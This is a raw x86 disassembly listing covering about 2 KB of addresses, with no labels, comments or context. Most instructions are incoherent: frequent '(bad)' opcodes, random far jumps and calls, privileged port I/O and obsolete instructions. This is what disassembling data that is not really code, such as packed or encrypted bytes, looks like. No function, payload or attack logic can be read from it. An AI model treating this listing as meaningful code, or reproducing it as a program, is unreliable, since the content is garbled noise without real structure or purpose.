  4204c2:	call   0xf839f887
  4204c7:	push   0xbb5d3928
  4204cc:	dec    eax
  4204cd:	aas    
  4204ce:	push   cs
  4204cf:	pop    ebx
  4204d0:	pop    ecx
  4204d1:	cld    
  4204d2:	pop    esp
  4204d3:	sbb    eax,esi
  4204d5:	mov    dl,0x33
  4204d7:	test   BYTE PTR [esi],ah
  4204d9:	into   
  4204da:	add    DWORD PTR [edi],edi
  4204dc:	loope  0x420544
  4204de:	int3   
  4204df:	mov    esi,0x472dfd87
  4204e4:	sbb    DWORD PTR [esi],ecx
  4204e6:	out    0x67,eax
  4204e8:	mov    BYTE PTR [edi+eiz*1+0x1b071e5],al
  4204ef:	lock or DWORD PTR [esi+0x7e61d188],ebx
  4204f6:	sub    esi,DWORD PTR [eax+0x41]
  4204f9:	xchg   edx,eax
  4204fa:	popf   
  4204fb:	dec    ebx
  4204fc:	mov    WORD PTR [edi-0x12fc559e],?
  420502:	cmp    DWORD PTR [ecx],0xfffffffb
  420505:	mov    edi,0x50ab50d6
  42050a:	loope  0x4204ad
  42050c:	xor    ecx,edx
  42050e:	fsub   st(6),st
  420510:	shl    BYTE PTR [edx-0x77],1
  420513:	adc    ch,bh
  420515:	jecxz  0x420543
  420517:	push   edi
  420518:	jbe    0x4204fe
  42051a:	inc    ebx
  42051b:	pop    ebx
  42051c:	into   
  42051d:	(bad)  
  42051e:	mov    DWORD PTR [esi+0x65284dc4],ebp
  420524:	xchg   esp,eax
  420525:	bound  esp,QWORD PTR [edi]
  420527:	or     BYTE PTR [edx+0x17],al
  42052a:	mov    ebp,0xbcdcfa9
  42052f:	out    0x2,al
  420531:	push   cs
  420532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420533:	inc    eax
  420534:	cmp    al,0x58
  420536:	stos   BYTE PTR es:[edi],al
  420537:	clc    
  420538:	push   esp
  420539:	fidivr WORD PTR [edi]
  42053b:	pushf  
  42053c:	popa   
  42053d:	xor    DWORD PTR [edx],ebx
  42053f:	jmp    0x2a9e:0x5062210d
  420546:	repz mov ds:0xdd712809,al
  42054c:	retf   0xe509
  42054f:	std    
  420550:	ja     0x42058d
  420552:	push   0x6574d65f
  420557:	mov    ds:0xc3faa014,al
  42055c:	inc    ebx
  42055d:	test   BYTE PTR [edi-0x305f881b],al
  420563:	xor    eax,0x8fed5115
  420568:	xchg   ebp,eax
  420569:	lea    edx,[esi]
  42056b:	inc    esi
  42056c:	sub    eax,0x2dae4c56
  420571:	add    al,0xac
  420573:	sbb    dh,al
  420575:	clc    
  420576:	xor    DWORD PTR ds:0xcca38ba7,edx
  42057c:	cmp    DWORD PTR [ebx],0xd87fd304
  420582:	inc    BYTE PTR [eax+0x4652beae]
  420588:	test   DWORD PTR [eax-0x7],esi
  42058b:	dec    edi
  42058c:	or     al,0xf
  42058e:	pop    esi
  42058f:	xor    cl,BYTE PTR [ebp+0x5b45c46]
  420595:	call   0x4d8d476c
  42059a:	test   BYTE PTR [esi+0x1c67e8a7],cl
  4205a0:	cmp    BYTE PTR [eax],ah
  4205a2:	(bad)  [ecx]
  4205a4:	xchg   edx,eax
  4205a5:	xor    al,0xdd
  4205a7:	xchg   edi,eax
  4205a8:	jl     0x42053b
  4205aa:	or     BYTE PTR [edx+esi*8+0x19a1a201],dh
  4205b1:	fild   WORD PTR [eax+0x46]
  4205b4:	sub    esi,esi
  4205b6:	pop    ebx
  4205b7:	imul   ebp,DWORD PTR [ecx-0x19ea9b9b],0xcc0148b2
  4205c1:	pop    ecx
  4205c2:	push   0x2
  4205c4:	cwde   
  4205c5:	repz adc edi,DWORD PTR [esi+eax*2-0x2]
  4205ca:	iret   
  4205cb:	ret    
  4205cc:	outs   dx,BYTE PTR ds:[esi]
  4205cd:	loop   0x420601
  4205cf:	xor    bh,BYTE PTR [ebx+0x30]
  4205d2:	pop    ecx
  4205d3:	dec    ecx
  4205d4:	dec    ecx
  4205d5:	pushf  
  4205d6:	ins    DWORD PTR es:[edi],dx
  4205d7:	sub    ah,dh
  4205d9:	in     eax,0x31
  4205db:	retf   0x9a56
  4205de:	loopne 0x4205c7
  4205e0:	shl    DWORD PTR [esi+0x4aa54d9f],1
  4205e6:	mov    ecx,0x5294419b
  4205eb:	(bad)  
  4205ec:	push   ds
  4205ed:	sahf   
  4205ee:	jle    0x4205d2
  4205f0:	shl    eax,1
  4205f2:	dec    eax
  4205f3:	sbb    ch,BYTE PTR [edx]
  4205f5:	mov    ds:0xbd96c50b,eax
  4205fa:	pop    ebp
  4205fb:	bound  edx,QWORD PTR [bp+di-0x7e]
  4205ff:	adc    al,0x22
  420601:	pop    edx
  420602:	(bad)  
  420603:	out    0x5d,al
  420605:	mov    edx,0x964edf4d
  42060a:	out    dx,eax
  42060b:	push   ds
  42060c:	pusha  
  42060d:	(bad)  
  42060e:	push   edx
  42060f:	shl    edx,cl
  420611:	cmp    ch,BYTE PTR [edx+0x2476c806]
  420617:	cmp    eax,0x4d88c946
  42061c:	mov    esp,0xf276661
  420621:	(bad)  
  420622:	retf   
  420623:	js     0x420602
  420625:	(bad)  
  420626:	sub    cl,BYTE PTR [esp+eiz*4]
  420629:	leave  
  42062a:	jmp    0x178cdf1d
  42062f:	bound  esp,QWORD PTR [ebx+0x20]
  420632:	call   0xc7f6707
  420637:	mov    dh,0xfb
  420639:	or     DWORD PTR [edi-0x4f3bc086],ebp
  42063f:	sbb    eax,0x3f2cd440
  420644:	add    edx,esi
  420646:	push   ecx
  420647:	xlat   BYTE PTR ds:[ebx]
  420648:	out    0x44,al
  42064a:	ins    DWORD PTR es:[edi],dx
  42064b:	or     esp,DWORD PTR ds:0xc56003fe
  420651:	repz mov ch,0xe0
  420654:	inc    ebx
  420655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420656:	shl    BYTE PTR [ecx+0x55],cl
  420659:	mov    eax,ds:0xe2f380ef
  42065e:	cmp    eax,0x2d0b74f2
  420663:	loop   0x4205f2
  420665:	sbb    al,0xa
  420667:	mov    ebx,0x8c2bcf80
  42066c:	cdq    
  42066d:	mov    edi,ebx
  42066f:	pop    ecx
  420670:	xchg   esi,eax
  420671:	out    dx,eax
  420672:	or     ah,BYTE PTR [edi+0x58f2110d]
  420678:	adc    DWORD PTR [ecx],ecx
  42067a:	and    DWORD PTR [edi+edx*8+0x5ce11337],edi
  420681:	(bad)  
  420682:	xchg   edi,eax
  420683:	or     DWORD PTR [eax+0x2ae86e19],0xffffff87
  42068a:	mov    edx,0x3b361ab8
  42068f:	xchg   esp,eax
  420690:	sbb    DWORD PTR [ebx-0x7f771702],edi
  420696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420697:	push   ds
  420698:	std    
  420699:	mov    esi,0xbccaee35
  42069e:	push   cs
  42069f:	sub    dl,BYTE PTR [esi]
  4206a1:	je     0x4206d2
  4206a3:	mov    edx,0x828471f3
  4206a8:	imul   esp,edi,0x37
  4206ab:	clc    
  4206ac:	inc    edi
  4206ad:	xor    eax,0x1d4e3679
  4206b2:	jmp    0xfbdf:0x7e3827d1
  4206b9:	and    BYTE PTR [edx+0x2636b1f1],cl
  4206bf:	ror    BYTE PTR [ebp+0x83b8357],0x49
  4206c6:	xchg   ebp,eax
  4206c7:	xchg   BYTE PTR [eax+edi*4-0x4],ah
  4206cb:	cs in  eax,dx
  4206cd:	test   eax,0x75e4bfff
  4206d2:	inc    edi
  4206d3:	mov    edi,0x698c0bd4
  4206d8:	fwait
  4206d9:	sub    eax,0x3a74c56f
  4206de:	aam    0x80
  4206e0:	xchg   edx,eax
  4206e1:	(bad)  
  4206e2:	mov    ecx,0x3cf059ab
  4206e7:	(bad)  
  4206e9:	xchg   BYTE PTR [ecx-0x27e298f7],dh
  4206ef:	and    ah,dl
  4206f1:	add    cl,BYTE PTR [edx-0x37]
  4206f4:	(bad)  
  4206f5:	mov    eax,ds:0x26fa82db
  4206fa:	aad    0x70
  4206fc:	dec    esi
  4206fd:	mov    ebp,DWORD PTR [eax+ebx*8-0xa]
  420701:	mov    eax,0x7abe09c
  420706:	sbb    ah,bl
  420708:	jo     0x4206f4
  42070a:	cmp    ecx,DWORD PTR [edi-0x75]
  42070d:	leave  
  42070e:	or     al,BYTE PTR [edx+0x1]
  420711:	pop    edx
  420712:	ins    DWORD PTR es:[edi],dx
  420713:	cld    
  420714:	mov    ah,0x8f
  420716:	fld    TBYTE PTR [ebp+0x44]
  420719:	fs sub al,0x25
  42071c:	loope  0x4206dc
  42071e:	and    DWORD PTR [eax+0x514217f0],ecx
  420724:	push   esp
  420725:	lods   al,BYTE PTR ds:[esi]
  420726:	(bad)  [esp+edi*4]
  420729:	iret   
  42072a:	mov    esp,edi
  42072c:	dec    esp
  42072d:	inc    esi
  42072e:	sahf   
  42072f:	fwait
  420730:	lods   al,BYTE PTR cs:[esi]
  420732:	mov    ebx,0xc0903890
  420737:	mov    ds:0x808494c9,eax
  42073c:	scas   eax,DWORD PTR es:[edi]
  42073d:	les    ebx,FWORD PTR [esi+ecx*2-0x65]
  420741:	sub    eax,DWORD PTR [ebx+0x4345ef7d]
  420747:	inc    eax
  420748:	jge    0x420789
  42074a:	xchg   ebx,eax
  42074b:	mov    bl,0x20
  42074d:	sbb    edi,DWORD PTR [ecx+esi*4]
  420750:	(bad)  
  420751:	dec    esi
  420752:	pop    ebx
  420753:	ret    
  420754:	xchg   dl,dl
  420756:	mov    ds:0xdd3346b1,eax
  42075b:	idiv   DWORD PTR [ecx-0x1]
  42075e:	sbb    eax,0x55962404
  420763:	adc    al,0xba
  420765:	clc    
  420766:	jg     0x42070f
  420768:	pushf  
  420769:	enter  0xc4b6,0xf0
  42076d:	xchg   ecx,eax
  42076e:	into   
  42076f:	inc    edx
  420770:	pushf  
  420771:	add    eax,0x6df79f95
  420776:	jbe    0x420752
  420778:	xor    ebp,edi
  42077a:	retf   
  42077b:	out    dx,eax
  42077c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42077d:	cmc    
  42077e:	or     al,0xa3
  420780:	sbb    eax,0xf4d1c5ba
  420785:	xchg   edx,eax
  420786:	popa   
  420787:	pop    ebp
  420788:	retf   0xe644
  42078b:	retf   
  42078c:	cmp    DWORD PTR [eax+0x6a],ebp
  42078f:	push   ss
  420790:	and    esi,DWORD PTR [ebx+0x2d]
  420793:	idiv   edx
  420795:	dec    eax
  420796:	in     eax,0x98
  420798:	push   0x7f
  42079a:	inc    eax
  42079b:	jne    0x420744
  42079d:	jo     0x420789
  42079f:	and    eax,0x3bad6e2b
  4207a4:	dec    ebp
  4207a5:	ja     0x420764
  4207a7:	(bad)  
  4207a8:	daa    
  4207a9:	mov    esi,0xf328f1d9
  4207ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207af:	mov    BYTE PTR [eax+0x50f4024a],ah
  4207b5:	ret    0x5354
  4207b8:	xchg   edx,eax
  4207b9:	xchg   ebp,eax
  4207ba:	lods   eax,DWORD PTR ds:[esi]
  4207bb:	aam    0xf3
  4207bd:	enter  0x7b03,0x4a
  4207c1:	out    dx,al
  4207c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c3:	sbb    eax,0x596ce592
  4207c8:	sbb    BYTE PTR [ebx+eiz*8-0x3e],ah
  4207cc:	loope  0x420840
  4207ce:	push   0xbc9b072f
  4207d3:	ss inc esi
  4207d5:	jne    0x4207eb
  4207d7:	push   0x88edc6a
  4207dc:	shr    BYTE PTR [ecx-0x63b0ae11],cl
  4207e2:	and    cl,BYTE PTR [edx]
  4207e4:	call   0x65f786b0
  4207e9:	pop    esp
  4207ea:	or     BYTE PTR [esp],dh
  4207ed:	test   eax,0x80bd015c
  4207f2:	test   BYTE PTR [edx],0x59
  4207f5:	mov    ch,dl
  4207f7:	push   cs
  4207f8:	jbe    0x42083a
  4207fa:	mov    ecx,0x8340b7fc
  4207ff:	cli    
  420800:	imul   esp,ebp,0x52
  420803:	div    ebp
  420805:	xor    eax,0xfb860fec
  42080a:	scas   eax,DWORD PTR es:[edi]
  42080b:	and    bh,ch
  42080d:	icebp  
  42080e:	mov    ecx,0x27b73ca9
  420813:	xor    DWORD PTR [ebp-0x7f],ebp
  420816:	in     eax,dx
  420817:	repnz mov esi,DWORD PTR [edi+0x1c]
  42081b:	int    0x88
  42081d:	jmp    0x420857
  42081f:	mov    bl,0x3c
  420821:	dec    edi
  420822:	ret    0xf8f9
  420825:	dec    ebp
  420826:	mov    bh,0x1
  420828:	mov    ecx,0x7c20f18a
  42082d:	push   ds
  42082e:	pop    es
  42082f:	inc    edi
  420830:	cmp    cl,bl
  420832:	sub    BYTE PTR [edx],cl
  420834:	mov    ch,0xd2
  420836:	lds    ebp,FWORD PTR [eax]
  420838:	dec    esi
  420839:	(bad)  
  42083a:	lahf   
  42083b:	mov    ds:0xbc4b24a,al
  420840:	es pushw es
  420843:	dec    ecx
  420844:	jo     0x42085b
  420846:	bound  esp,QWORD PTR [esi+0x37]
  420849:	xlat   BYTE PTR ds:[ebx]
  42084a:	and    ebp,DWORD PTR [ebx]
  42084c:	addr16 xchg esp,eax
  42084e:	mov    bl,0x8f
  420850:	cmp    eax,0xa669d9dc
  420855:	inc    esp
  420856:	test   DWORD PTR [esi-0x5],esi
  420859:	xchg   edx,eax
  42085a:	xlat   BYTE PTR ds:[ebx]
  42085b:	ja     0x42080d
  42085d:	jmp    0x7ed5:0xee560986
  420864:	pop    ebx
  420865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420866:	push   esi
  420867:	mov    dh,0x2c
  420869:	stc    
  42086a:	fmul   DWORD PTR [edx+edi*1]
  42086d:	inc    esp
  42086e:	mov    edx,0xe5603df4
  420873:	pop    ebx
  420874:	push   esp
  420875:	aad    0xea
  420877:	and    dh,ch
  420879:	jo     0x4208b6
  42087b:	stos   DWORD PTR es:[edi],eax
  42087c:	jo     0x4208b3
  42087e:	or     ebp,0xfffffffe
  420881:	xchg   BYTE PTR [ecx],al
  420883:	adc    esi,esp
  420885:	enter  0x42d5,0x5f
  420889:	sub    edi,ebp
  42088b:	scas   al,BYTE PTR es:[edi]
  42088c:	fnsetpm(287 only) 
  42088e:	jns    0x4208f1
  420890:	xor    BYTE PTR [ecx-0x6],al
  420893:	fdiv   DWORD PTR [eax]
  420895:	push   esp
  420896:	lods   al,BYTE PTR ds:[esi]
  420897:	and    DWORD PTR [esi],edx
  420899:	sub    DWORD PTR [esi+ecx*8],esp
  42089c:	mov    ebx,ebp
  42089e:	ins    DWORD PTR es:[edi],dx
  42089f:	cmp    BYTE PTR ds:0x9ff0800b,dl
  4208a5:	in     al,0x60
  4208a7:	aaa    
  4208a8:	xchg   ebp,eax
  4208a9:	and    dl,bl
  4208ab:	mov    BYTE PTR [ecx],cl
  4208ad:	fwait
  4208ae:	xchg   ebx,eax
  4208af:	adc    esi,DWORD PTR ds:0xa1b5cc0d
  4208b5:	jno    0x4208ac
  4208b7:	inc    edi
  4208b8:	cwde   
  4208b9:	sub    ecx,DWORD PTR [eax-0x62]
  4208bc:	adc    ah,dh
  4208be:	add    bh,bl
  4208c0:	mov    ebp,0x9b28c969
  4208c5:	enter  0xf473,0x31
  4208c9:	or     al,0xbf
  4208cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208cc:	sbb    al,bh
  4208ce:	add    al,0x5e
  4208d0:	mov    ecx,0xbe873398
  4208d5:	out    dx,al
  4208d6:	shr    DWORD PTR [edi-0xc26dbc1],cl
  4208dc:	add    bh,bh
  4208de:	push   edx
  4208df:	push   ebx
  4208e0:	es jl  0xef80be80
  4208e7:	xchg   dl,bh
  4208e9:	adc    cl,BYTE PTR [edi]
  4208eb:	mov    dh,0x7a
  4208ed:	outs   dx,DWORD PTR ds:[esi]
  4208ee:	cmp    eax,edx
  4208f0:	icebp  
  4208f1:	cdq    
  4208f2:	and    DWORD PTR [edi+0x589e18ef],ecx
  4208f8:	int    0xe
  4208fa:	(bad)  
  4208fb:	dec    edi
  4208fc:	xor    DWORD PTR [edx+ebp*8],esp
  4208ff:	fdivr  DWORD PTR [ebx+0x1af4df6]
  420905:	je     0x4208b0
  420907:	jge    0x42089d
  420909:	sti    
  42090a:	inc    edi
  42090b:	push   ds
  42090c:	dec    eax
  42090d:	mov    WORD PTR [ecx-0x4e],?
  420910:	adc    ebp,0x41302bd
  420916:	pop    ebx
  420917:	or     edi,DWORD PTR [ebp+0xfca1d72]
  42091d:	cmp    al,0xce
  42091f:	test   eax,0x4f341173
  420924:	sbb    BYTE PTR [ebx+ebp*4-0x59],ch
  420928:	or     al,0xa4
  42092a:	mov    al,ds:0xaf5bbce0
  42092f:	pop    edx
  420930:	enter  0x215,0x4e
  420934:	adc    BYTE PTR [eax-0x6a],0xe2
  420938:	dec    eax
  420939:	pop    ebx
  42093a:	adc    BYTE PTR [eax+0xbe35043],ah
  420940:	test   eax,0xb2aa77f5
  420945:	and    DWORD PTR [ebx],esp
  420947:	pop    ecx
  420948:	mov    ds:0xdec922f3,eax
  42094d:	icebp  
  42094e:	mov    ds:0xb3bca5d0,al
  420953:	adc    bl,BYTE PTR [esi]
  420955:	out    0xa7,eax
  420957:	lds    ebx,FWORD PTR [ebp+edx*8-0x39]
  42095b:	jns    0x420967
  42095d:	pop    ebx
  42095e:	mov    esp,0xd797af05
  420963:	push   ecx
  420964:	fdivp  st(4),st
  420966:	mov    edx,0xe9e66b7c
  42096b:	fcomp  QWORD PTR [ebx+0x44ab00b8]
  420971:	out    0x1f,eax
  420973:	inc    eax
  420974:	int    0x5
  420976:	sub    al,0x21
  420978:	mov    BYTE PTR [edi-0x6b88df48],ah
  42097e:	xchg   DWORD PTR [edi+edx*8],eax
  420981:	mov    edx,0x943b82e4
  420986:	mov    ss,edi
  420988:	sub    eax,0x2333631f
  42098d:	or     al,0x2c
  42098f:	outs   dx,BYTE PTR ds:[esi]
  420990:	cmp    esi,DWORD PTR [edi]
  420992:	push   eax
  420993:	cli    
  420994:	sbb    ebp,esi
  420996:	or     eax,0x5da3d748
  42099b:	rcl    BYTE PTR [edi],1
  42099d:	and    bl,cl
  42099f:	bound  esi,QWORD PTR [edi-0x54]
  4209a2:	mov    ebx,0x2ce6fdcb
  4209a7:	mov    esi,0x23582ba1
  4209ac:	mov    ebx,0x5abcb079
  4209b1:	pushf  
  4209b2:	mov    eax,ds:0xc5514abc
  4209b7:	pop    ecx
  4209b8:	mov    edi,0x13ae2b0c
  4209bd:	je     0x420940
  4209bf:	aaa    
  4209c0:	ins    BYTE PTR es:[edi],dx
  4209c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c2:	es dec edx
  4209c4:	iret   
  4209c5:	inc    esi
  4209c6:	mov    ebx,0x6e90a622
  4209cb:	xlat   BYTE PTR ds:[ebx]
  4209cc:	mov    DWORD PTR [ebp+0x4fb01515],esi
  4209d2:	lock sub BYTE PTR [ebx],ah
  4209d5:	lsl    ebp,WORD PTR [edi+0x706f29d0]
  4209dc:	test   eax,0xadd14276
  4209e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e2:	push   cs
  4209e3:	test   eax,0xfb315bc3
  4209e8:	add    BYTE PTR [edi+0x1],cl
  4209eb:	aad    0x3d
  4209ed:	push   ebx
  4209ee:	into   
  4209ef:	mov    ebp,0x8aee8059
  4209f4:	mov    al,ds:0x610a2971
  4209f9:	cmp    BYTE PTR [edi-0x1d8a04b1],dl
  4209ff:	add    DWORD PTR [ebp+0x29],esp
  420a02:	cmp    eax,0xcc9bdad4
  420a07:	sti    
  420a08:	fdiv   st(5),st
  420a0a:	(bad)  
  420a0b:	jns    0x4209c4
  420a0d:	push   0x32
  420a0f:	mov    BYTE PTR [eax+ebx*1],bl
  420a12:	popf   
  420a13:	fwait
  420a14:	shl    DWORD PTR [edx],1
  420a16:	xchg   edx,eax
  420a17:	mov    bl,0xa0
  420a19:	arpl   WORD PTR [esi-0x12349b5a],di
  420a1f:	lahf   
  420a20:	fnstenv [esi+eax*8]
  420a23:	sbb    al,0x9d
  420a25:	cli    
  420a26:	pop    eax
  420a27:	cmc    
  420a28:	cli    
  420a29:	push   cs
  420a2a:	dec    eax
  420a2b:	and    bl,0xc2
  420a2e:	(bad)  
  420a2f:	ja     0x420a13
  420a31:	loope  0x4209cf
  420a33:	add    ebp,DWORD PTR [ecx-0x1b123788]
  420a39:	cmp    ch,BYTE PTR [ebp+0x31]
  420a3c:	jmp    0xddae:0xf337c13d
  420a43:	mov    DWORD PTR [esi+0x7c],ecx
  420a46:	sub    BYTE PTR [esi],bh
  420a48:	mov    DWORD PTR [edi],esi
  420a4a:	xor    al,0xd3
  420a4c:	push   esi
  420a4d:	sub    al,0xe6
  420a4f:	dec    ebx
  420a50:	jmp    0x427be6cd
  420a55:	or     DWORD PTR [edx],edi
  420a57:	adc    eax,0x64b88256
  420a5c:	retf   
  420a5d:	pusha  
  420a5e:	aam    0x22
  420a60:	je     0x420a16
  420a62:	or     BYTE PTR [ebx+0x12],bh
  420a65:	fidiv  WORD PTR [ebp-0x595f2acb]
  420a6b:	push   cs
  420a6c:	jp     0x420a4b
  420a6e:	test   ebx,ebp
  420a70:	(bad)  
  420a71:	jnp    0x420acf
  420a73:	adc    eax,0x9d407631
  420a78:	and    ecx,DWORD PTR [esi]
  420a7a:	inc    ebx
  420a7b:	call   0x1d462e7f
  420a80:	(bad)  [ecx-0x2a9596af]
  420a86:	(bad)  
  420a87:	xchg   edx,eax
  420a88:	gs jmp 0x420a46
  420a8b:	jne    0x420ac3
  420a8d:	jns    0x420a5b
  420a8f:	adc    dl,ch
  420a91:	mov    BYTE PTR [ebp+0x204290aa],bl
  420a97:	mov    ecx,esi
  420a99:	sub    eax,0x64801317
  420a9e:	fdiv   QWORD PTR [ebx]
  420aa0:	pop    esi
  420aa1:	mov    dl,0x4b
  420aa3:	lds    ebp,FWORD PTR [ecx+0x20]
  420aa6:	add    DWORD PTR [esi-0x73a5cfdc],eax
  420aac:	repz xor BYTE PTR [ecx],ah
  420aaf:	xchg   BYTE PTR [ebx+0x98485cc],bl
  420ab5:	test   DWORD PTR [esi+0x23ec6d43],edx
  420abb:	(bad)  
  420abd:	xor    ebx,DWORD PTR [edi-0x280503fe]
  420ac3:	inc    eax
  420ac4:	out    0xf5,al
  420ac6:	ret    0x3868
  420ac9:	jle    0x420b49
  420acb:	lock into 
  420acd:	daa    
  420ace:	xor    ebp,0x2d87ad2d
  420ad4:	sbb    DWORD PTR [ecx-0x6053d536],0xcec80dab
  420ade:	push   edx
  420adf:	add    eax,0x66ac6f7f
  420ae4:	sbb    BYTE PTR [eax-0x656be8e8],dl
  420aea:	cmc    
  420aeb:	push   es
  420aec:	loope  0x420b42
  420aee:	sub    BYTE PTR [edi],ch
  420af0:	scas   al,BYTE PTR es:[edi]
  420af1:	ins    DWORD PTR es:[edi],dx
  420af2:	pop    ecx
  420af3:	test   eax,0x865ac7a4
  420af8:	(bad)  
  420af9:	mov    ds:0xf5d59f40,eax
  420afe:	repnz gs adc al,0xd5
  420b02:	cmc    
  420b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b04:	je     0x420aa3
  420b06:	cmp    ecx,esi
  420b08:	popa   
  420b09:	mov    eax,ebp
  420b0b:	pusha  
  420b0c:	xor    ebp,DWORD PTR [ebx+eiz*8]
  420b0f:	or     al,BYTE PTR [ecx+0x6c788fef]
  420b15:	fdiv   QWORD PTR [edx+ecx*2]
  420b18:	clc    
  420b19:	lahf   
  420b1a:	js     0x420ac2
  420b1c:	dec    ebp
  420b1d:	inc    ebp
  420b1e:	and    esp,DWORD PTR [ecx-0x6c]
  420b21:	pop    esi
  420b22:	fstp   QWORD PTR cs:[edi-0x67]
  420b26:	push   edx
  420b27:	mov    WORD PTR [ebx-0x2c],ss
  420b2a:	outs   dx,DWORD PTR ds:[esi]
  420b2b:	shl    dl,cl
  420b2d:	cld    
  420b2e:	inc    ecx
  420b2f:	jnp    0x420b5d
  420b31:	mov    bh,BYTE PTR [ebx-0xc]
  420b34:	inc    edi
  420b35:	mov    bl,0x87
  420b37:	mov    ch,0x94
  420b39:	stos   BYTE PTR es:[edi],al
  420b3a:	sub    ebx,ebx
  420b3c:	pop    ebp
  420b3d:	test   al,0x17
  420b3f:	(bad)  
  420b40:	jnp    0x420b74
  420b42:	jmp    0xb019:0x1271f933
  420b49:	imul   esi,DWORD PTR [edi-0x18],0xd9dbe2c5
  420b50:	mov    bh,0x9e
  420b52:	cmp    bl,BYTE PTR [ebx+0x5e052aae]
  420b58:	and    BYTE PTR [esi],dh
  420b5a:	push   eax
  420b5b:	and    al,0xbf
  420b5d:	cwde   
  420b5e:	jmp    0xc3fc:0xe682f83e
  420b65:	cmp    eax,0xcdb1788b
  420b6a:	pop    esp
  420b6b:	psubsw mm7,QWORD PTR [esi+0x8]
  420b6f:	das    
  420b70:	loop   0x420bda
  420b72:	inc    esi
  420b73:	mov    bl,0xed
  420b75:	mov    WORD PTR [edx+ebx*8-0x5c],gs
  420b79:	mov    esi,0xf6d7b0ba
  420b7e:	sbb    dh,dh
  420b80:	xchg   esp,eax
  420b81:	scas   al,BYTE PTR es:[edi]
  420b82:	mul    DWORD PTR [esi]
  420b84:	mov    bh,0x11
  420b86:	cli    
  420b87:	dec    edi
  420b88:	pop    ebx
  420b89:	jnp    0x420b22
  420b8b:	ret    
  420b8c:	nop
  420b8d:	push   ebx
  420b8e:	dec    edi
  420b8f:	jecxz  0x420ba8
  420b91:	repz cdq 
  420b93:	stos   DWORD PTR es:[edi],eax
  420b94:	sar    BYTE PTR [eax],0x4d
  420b97:	inc    eax
  420b98:	ror    BYTE PTR ds:0x9a33659,cl
  420b9e:	cmp    eax,0x36783856
  420ba3:	in     al,dx
  420ba4:	push   cs
  420ba5:	scas   al,BYTE PTR es:[edi]
  420ba6:	mov    eax,ds:0xa341b174
  420bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bac:	inc    ecx
  420bad:	xor    DWORD PTR [ebp-0xe],esp
  420bb0:	std    
  420bb1:	xor    DWORD PTR [eax-0x2],ebx
  420bb4:	ins    DWORD PTR es:[edi],dx
  420bb5:	into   
  420bb6:	shl    eax,cl
  420bb8:	(bad)  
  420bb9:	or     BYTE PTR [edx+0x17ec4f54],cl
  420bbf:	jle    0x420b4e
  420bc1:	out    0x8,eax
  420bc3:	fadd   DWORD PTR [esi-0x663099be]
  420bc9:	and    eax,esp
  420bcb:	(bad)  
  420bce:	fs adc al,0xbe
  420bd1:	push   0xc27dddda
  420bd6:	jg     0x420c29
  420bd8:	out    0xe8,eax
  420bda:	jno    0x420c50
  420bdc:	pop    esp
  420bdd:	pop    ebx
  420bde:	pop    edi
  420bdf:	loop   0x420be5
  420be1:	mov    bl,0x21
  420be3:	sbb    bl,BYTE PTR [esi]
  420be5:	xchg   ebp,eax
  420be6:	xchg   esp,eax
  420be7:	inc    ecx
  420be8:	addr16 jl 0x420b7e
  420beb:	cmp    DWORD PTR [esi+0x39],edx
  420bee:	loop   0x420bca
  420bf0:	je     0x420c46
  420bf2:	int    0xf4
  420bf4:	cmp    al,0x17
  420bf6:	push   ebp
  420bf7:	outs   dx,BYTE PTR ds:[esi]
  420bf8:	xchg   ebp,eax
  420bf9:	add    ebp,DWORD PTR [eax]
  420bfb:	sub    cl,BYTE PTR [edx]
  420bfd:	jle    0x420b91
  420bff:	sub    esi,DWORD PTR cs:[edi+0x5a117373]
  420c06:	aaa    
  420c07:	int    0x34
  420c09:	jnp    0x420be3
  420c0b:	fistp  WORD PTR [esi+esi*4+0x4e1a7d52]
  420c12:	sti    
  420c13:	jge    0x420c54
  420c15:	or     ah,dh
  420c17:	call   FWORD PTR [esi+eiz*2]
  420c1a:	push   eax
  420c1b:	retf   0x9ce0
  420c1e:	lods   eax,DWORD PTR ds:[esi]
  420c1f:	fbld   TBYTE PTR [edx+0x35]
  420c22:	shl    DWORD PTR [ebp+ecx*1+0xa9ff1e5],cl
  420c29:	mov    ds:0xddfebbeb,eax
  420c2e:	les    eax,FWORD PTR [eax-0x2]
  420c31:	dec    esp
  420c32:	in     eax,dx
  420c33:	mov    esi,0xba2c6a83
  420c38:	mov    edx,0x59b2420f
  420c3d:	fsubr  QWORD PTR [ebx+0x7d]
  420c40:	and    DWORD PTR ds:0xb32f916d,eax
  420c46:	call   0x77c1:0xb045f6e8
  420c4d:	jmp    0x420c9d
  420c4f:	push   ebx
  420c50:	jge    0x420c30
  420c52:	sbb    DWORD PTR [esi-0x60],0x6
  420c56:	ins    DWORD PTR es:[edi],dx
  420c57:	mov    esi,DWORD PTR [esi+0x77]
  420c5a:	dec    esi
  420c5b:	sbb    al,0x3f
  420c5d:	push   0x1da77d54
  420c62:	scas   al,BYTE PTR es:[edi]
  420c63:	adc    BYTE PTR [edi],al
  420c65:	mov    dl,0x42
  420c67:	xchg   ebp,eax
  420c68:	push   eax
  420c69:	scas   al,BYTE PTR es:[edi]
  420c6a:	imul   esp,DWORD PTR [eax+0x44bd8d7a],0x6c
  420c71:	cmp    eax,0x3c882534
  420c76:	mov    ch,0x63
  420c78:	and    BYTE PTR [edx-0x75],ch
  420c7b:	and    DWORD PTR [edi+0x25],0x67
  420c7f:	fdiv   st(5),st
  420c81:	loop   0x420c8d
  420c83:	xchg   ecx,eax
  420c84:	jg     0x420c65
  420c86:	jmp    0x420cf3
  420c88:	stos   DWORD PTR es:[edi],eax
  420c89:	and    eax,0x58d64d34
  420c8e:	or     eax,0x40319577
  420c93:	rcr    BYTE PTR [ecx-0x51],0x6b
  420c97:	mov    eax,0x9084fa2d
  420c9c:	mov    dl,0xc3
  420c9e:	xchg   ebp,eax
  420c9f:	mov    WORD PTR [edi],es
